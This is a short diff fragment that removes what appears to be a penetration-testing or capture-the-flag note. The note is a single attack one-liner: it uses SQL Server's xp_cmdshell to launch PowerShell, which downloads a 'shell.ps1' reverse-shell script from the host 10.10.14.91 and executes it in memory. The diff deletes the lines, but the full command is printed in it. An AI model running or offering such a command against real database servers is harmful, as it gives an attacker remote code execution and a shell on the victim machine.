@@ -1,4 +1,0 @@
-
-
-Run powershell script(remoteshell) from web server with xp_cmdshell:
-xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.91/shell.ps1\");"
